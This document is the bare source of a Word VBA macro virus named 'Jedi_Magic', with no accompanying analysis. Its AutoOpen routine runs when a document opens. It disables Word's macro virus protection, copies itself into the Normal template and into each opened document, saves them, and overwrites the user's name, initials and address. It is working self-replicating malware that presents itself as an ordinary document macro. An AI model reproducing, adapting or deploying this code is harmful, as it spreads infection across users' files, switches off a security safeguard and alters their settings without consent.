   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Jedi_Magic"
   Sub AutoOpen()
   Attribute AutoOpen.VB_Description = "Macro created 03/12/98 by Membership & Registry Division"
   Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.Jedi_Magic.AutoOpen"
   Options.VirusProtection = False
   If Application.UserInitials <> "OBC" Then
       Application.OrganizerCopy Source:= _
       ActiveDocument.FullName, Destination:= _
       NormalTemplate.FullName, Name:="Jedi_Magic", _
       Object:=wdOrganizerObjectProjectItems
       NormalTemplate.Save
       Application.UserName = "O.B.1. Canobi"
       Application.UserInitials = "OBC"
       Application.UserAddress = "EGG BARBERS ... Puki Buster!!!"
   End If
   For Each aVar In ActiveDocument.Variables
       If aVar.Name = "Force" Then num = aVar.Index
   Next aVar
   If num = 0 Then
       Application.OrganizerCopy Source:= _
       NormalTemplate.FullName, Destination:= _
       ActiveDocument.FullName, Name:="Jedi_Magic", _
       Object:=wdOrganizerObjectProjectItems
       ActiveDocument.Variables.Add Name:="Force", Value:="567374-Joseph.A.D.G."
       ActiveDocument.Save
   End If
   End Sub
